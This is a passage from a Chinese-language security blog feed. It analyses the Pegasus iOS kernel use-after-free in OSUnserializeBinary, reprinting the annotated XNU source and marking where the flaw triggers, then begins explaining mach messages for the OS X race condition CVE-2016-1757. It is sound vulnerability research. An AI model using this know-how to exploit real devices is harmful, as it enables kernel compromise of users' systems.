class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">		<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">		&#123;</span><br><span class="line">		    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">		    o-&gt;release();		<span class="comment">//再次调用o的release函数，出发UAF。</span></span><br><span class="line">		    o = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ok = (sym != <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03_小结">0x03 小结</h1><p>​    这是今年在这个模块第二次出现<code>UAF</code>的漏洞了，在反序列化的流程中，将中间产生的元素存放在<code>objArrays</code>当中，在处理<code>reference</code>的时候进行使用，但是没有考虑到<code>reference</code>的流程中，会使用到已经被<code>free</code>的元素。</p>
<p>在过去的日常开发中，反思字节开发的序列化库，也确实经常会做类似的处理，默认了函数的输入都是合理的数据，并对序列化产生的数据进行了详细的测试，确保反序列化不会出问题，但是并没有考虑到恶意构造的二进制数据和序列化函数产生的二进制数据，在执行时可能会造成不同的流程。</p>
<h1 id="reference">reference</h1><p>1.PEGASUS iOS Kernel Vulnerability Explaine</p>
<p> <a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html</a></p>
<p>2.PEGASUS iOS Kernel Vulnerability Explained - Part 2</p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html</a></p>
<h1 id="附">附</h1><p>源码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">#define setAtIndex(v, idx, o)													\</span><br><span class="line">	if (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + 64;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		if (!nbuf) ok = false;													\</span><br><span class="line">		if (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	if (ok) v##Array[idx] = o;</span><br><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	OSObject ** objsArray;</span><br><span class="line">	uint32_t    objsCapacity;</span><br><span class="line">	uint32_t    objsIdx;</span><br><span class="line"></span><br><span class="line">	OSObject ** stackArray;</span><br><span class="line">	uint32_t    stackCapacity;</span><br><span class="line">	uint32_t    stackIdx;</span><br><span class="line"></span><br><span class="line">    OSObject     * result;</span><br><span class="line">    OSObject     * parent;</span><br><span class="line">    OSDictionary * dict;</span><br><span class="line">    OSArray      * array;</span><br><span class="line">    OSSet        * set;</span><br><span class="line">    OSDictionary * newDict;</span><br><span class="line">    OSArray      * newArray;</span><br><span class="line">    OSSet        * newSet;</span><br><span class="line">    OSObject     * o;</span><br><span class="line">    OSSymbol     * sym;</span><br><span class="line">    OSString     * str;</span><br><span class="line"></span><br><span class="line">    size_t           bufferPos;</span><br><span class="line">    const uint32_t * next;</span><br><span class="line">    uint32_t         key, len, wordLen;</span><br><span class="line">    bool             end, newCollect, isRef;</span><br><span class="line">    unsigned long long value;</span><br><span class="line">    bool ok;</span><br><span class="line"></span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">	// 检测是否是是具有签名的内存数据</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	// 0000 0011 &amp;&amp; buffer指针 ==》buffer的地址末尾不能是11</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// 跳过内存开始的签名部分，获取第一个需要解析的内存</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// 通过next指向的内容获取当前的key的pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// 检测是否分析完成</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// 获取当前的key</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //计算要用几个word</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//根据key的不同对不同的数据结构做操作</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeSet:</span><br><span class="line">				o = newSet = OSSet::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeObject:</span><br><span class="line">				if (len &gt;= objsIdx) break;</span><br><span class="line">				o = objsArray[len];</span><br><span class="line">				o-&gt;retain();</span><br><span class="line">				isRef = true;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeNumber:</span><br><span class="line">				bufferPos += sizeof(long long);</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		    	value = next[1];</span><br><span class="line">		    	value &lt;&lt;= 32;</span><br><span class="line">		    	value |= next[0];</span><br><span class="line">		    	o = OSNumber::withNumber(value, len);</span><br><span class="line">		    	next += 2;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeSymbol:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize)           break;</span><br><span class="line">				if (0 != ((const char *)next)[len-1]) break;</span><br><span class="line">		        o = (OSObject *) OSSymbol::withCString((const char *) next);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeData:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSData::withBytes(next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeBoolean:</span><br><span class="line">				o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//退出循环</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//如果反序列化的结果不是一个reference</span><br><span class="line">		//就将结果存放到objsCapacity之中</span><br><span class="line">		//如果反序列化自后内存申请失败,则退出反序列化</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//如果ok的值为false，则退出反序列化循环</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	\</span><br><span class="line">					kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//如果存在一个解析出来的dict</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			if (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG("%s = %s\n", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				if (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = 0;</span><br><span class="line">			&#125;</span><br><span class="line">			else </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">				if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = 0;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != 0);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = array-&gt;setObject(o);</span><br><span class="line">		    o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   ok = set-&gt;setObject(o);</span><br><span class="line">		   o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    assert(!parent);</span><br><span class="line">		    result = o;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> <a href="http://blog.pangu.io/pegasus-apt/">Pegasus – 针对iOS设备的APT攻击分析- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html">iOS“远程越狱”间谍软件Pegasus技术分析</a></p>
<p>关心<code>IOS</code>安全的技术人员最近一定都关注了这一次的安全事件，不需要多做描述了，想了解具体细节的可以自行<code>google</code>。</p>
<p>本文内容</p>
<ul>
<li>了漏洞所在的函数<code>OSUnserializeBinary</code>，了解其二进制格式</li>
<li>理解<code>POC</code>，分析<code>POC</code>执行的流程</li>
</ul>
<p>具体的技术背景，可以参考下面这篇文章</p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html">iOS三叉戟漏洞补丁分析、利用代码 公布（POC）</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IOS" scheme="http://turingh.github.io/tags/IOS/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="Pegasus" scheme="http://turingh.github.io/tags/Pegasus/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[再看CVE-2016-1757---浅析mach message的使用]]></title>
    <link href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://turingh.github.io/2016/07/05/再看CVE-2016-1757浅析mach message的使用/</id>
    <published>2016-07-06T00:55:33.000Z</published>
    <updated>2016-07-06T06:16:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757" target="_blank" rel="external">CVE-2016-1757</a>是一个<code>OS X</code>系统上通过条件竞争实现任意代码在<code>root</code>权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及<code>EXP</code>代码的实现。</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757简单分析</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757利用程序分析</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a></p>
<p>在<code>syscan2016</code>上又有国外的安全研究人员放出自己的<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">利用代码</a>。学习之后，这个利用代码确实比之前的更加清晰、明确。更加容易理解。</p>
<p>而两个利用本质上面的不同是对<code>mach port</code>的不同的利用方法。下面主要结合两个不同的POC，来分析一下<code>mach message</code>的使用，同时也是研究<code>xnu</code>的<code>IPC</code>的基础。</p>
<a id="more"></a>
<h1 id="0x01_Mach">0x01 Mach</h1><p><code>Mach</code>在<code>OS X</code>的内核中处于最接近底层的一个模块。是<code>XNU</code>内核的内核。是一个<code>BSD</code>层包裹的<code>微内核</code>。而内核中的<code>task</code>,<code>thread</code>,<code>virtual memory</code>等模块，对于<code>Mach</code>来说，都是一个<code>Object</code>。这些<code>Objects</code>基于<code>Mach</code>实现自己的功能，并且通过<code>Mach Message</code>来进行相互之间的通信。</p>
<blockquote>
<p>The Mach kernel thus becomes a low-level foundation, concerning itself with only the bare mini-mum required for driving the operating system. Everything else may be implemented by some higher    layer of an operating system, which then draws on the Mach primitives and manipulate them inwhatever way it sees fit.                                        </p>
<p>​                                                                                                           ——–Mac OS® X and iOS Internals    </p>
</blockquote>
<h2 id="1-1_Mach_Messages">1.1 Mach Messages</h2><p><code>Mach Messages</code>总共有两种，分别是<code>Simple Messages</code>和<code>Complex Messages</code>。</p>
<h3 id="1-1-1_Simple_Message">1.1.1 Simple Message</h3><p><code>Simple Message</code>的结构体，大致如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/simple_message.png?1" alt="simple message"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">natural_t</span>			pad1;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="keyword">mach_msg_type_descriptor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="keyword">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="keyword">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="keyword">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="keyword">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="keyword">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="keyword">mach_msg_header_t</span>;</span><br></pre></td></tr></table></figure>
<p>在使用<code>mach message</code>时,可以自己定义一个数据结构，更方便的编写代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">    <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">    <span class="keyword">mach_msg_type_descriptor_t</span> type;</span><br><span class="line">&#125; message;</span><br><span class="line"></span><br><span class="line">message.header = (<span class="keyword">mach_msg_header_t</span>) &#123;</span><br><span class="line">    .msgh_remote_port = port,</span><br><span class="line">    .msgh_local_port = MACH_PORT_NULL,</span><br><span class="line">    .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>),</span><br><span class="line">    .msgh_size = <span class="keyword">sizeof</span>(message)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.body = (<span class="keyword">mach_msg_body_t</span>) &#123;</span><br><span class="line">    .msgh_descriptor_count = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">message.type = (<span class="keyword">mach_msg_type_descriptor_t</span>) &#123;</span><br><span class="line">    .pad1 = data,</span><br><span class="line">    .pad2 = <span class="keyword">sizeof</span>(data)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>构建一个<code>message</code>，然后调用<code>mach API</code>发送这个消息。当然<code>msgh_descriptor_count</code>也可以是其他值，那么就要有相对于个数的<code>mach_msg_type_descriptor_t</code>。</p>
<h3 id="1-1-2_Complex_Messages">1.1.2 Complex Messages</h3><p><code>Complex Messages</code>和<code>Simple Message</code>对比，多了一个附加的数据<code>Mach Trailers</code>。并且数据描述符的定义也不同了。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/complex_message.png?1" alt="complex message"></p>
<p>描述符的定义如下</p>
